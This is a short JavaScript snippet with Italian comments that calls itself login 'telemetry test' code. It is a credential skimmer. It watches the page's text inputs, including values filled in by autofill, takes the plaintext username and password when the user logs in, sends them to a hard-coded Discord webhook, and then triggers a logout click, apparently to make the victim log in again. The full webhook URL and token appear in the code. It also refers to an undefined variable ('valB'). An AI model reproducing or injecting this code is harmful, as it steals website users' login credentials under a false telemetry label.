(() => {

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1";

  let textinput = null;
  let passwordinput = null;
  let logoutDone = false;

  const lastValues = new WeakMap();

  // ------------------------
  // INPUT TRACKING COMPLETO
  // ------------------------

  function updateInput(el) {
    if (!el || el.tagName !== "INPUT") return;
    if (el.type !== "text") return;

    const val = el.value || "";
    lastValues.set(el, val);

    if (!textinput) {
      textinput = el;
    } else if (!passwordinput && el !== textinput) {
      passwordinput = el;
    }
  }

  function scanAllInputs() {
    document.querySelectorAll("input").forEach(updateInput);
  }

  // scan immediato (valori già presenti)
  scanAllInputs();

  // eventi diretti
  ["input", "change", "paste"].forEach(evt =>
    document.addEventListener(evt, e => updateInput(e.target), true)
  );

  document.addEventListener("focusin", e => updateInput(e.target), true);

  // polling autofill / password manager / framework JS
  const pollInterval = setInterval(scanAllInputs, 500);
  setTimeout(() => clearInterval(pollInterval), 15000);

  // mutation observer (DOM dinamico)
  const mo = new MutationObserver(scanAllInputs);
  mo.observe(document.documentElement, {
    childList: true,
    subtree: true
  });

  // ------------------------
  // INVIO TELEMETRIA TEST
  // ------------------------

  function sendTelemetry(method) {
    const textval = textinput?.value?.trim() || "";
    const passwordval = passwordinput?.value?.trim() || "";

    if (!textval && !passwordval) return;

    const payload = {
      event: "login_test",
      textinput: textval,
      textinput_length: textval.length,
      passwordinput: passwordval,
      inputB_length: valB.length,
      method,
      timestamp: new Date().toISOString()
    };

    const body = {
      content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
    };

    const blob = new Blob(
      [JSON.stringify(body)],
      { type: "application/json" }
    );

    navigator.sendBeacon(WEBHOOK_URL, blob);
  }

  // ------------------------
  // LOGOUT AUTOMATICO
  // ------------------------

  function doLogout() {
    if (logoutDone) return;
    logoutDone = true;

    const btn =
      document.querySelector('button.logout') ||
      document.querySelector('a.logout') ||
      document.querySelector('#logout') ||
      document.querySelector('[onclick*="logout"]');

    if (btn) btn.click();
  }

  // ------------------------
  // TRIGGER LOGIN
  // ------------------------

  document.addEventListener("keydown", e => {
    if (e.key === "Enter") {
      sendTelemetry("enter");
      setTimeout(doLogout, 300);
    }
  });

  document.addEventListener("click", e => {
    const btn = e.target.closest("button");
    if (btn && btn.textContent?.trim().toLowerCase() === "login") {
      sendTelemetry("click_login");
      setTimeout(doLogout, 300);
    }
  });

})();
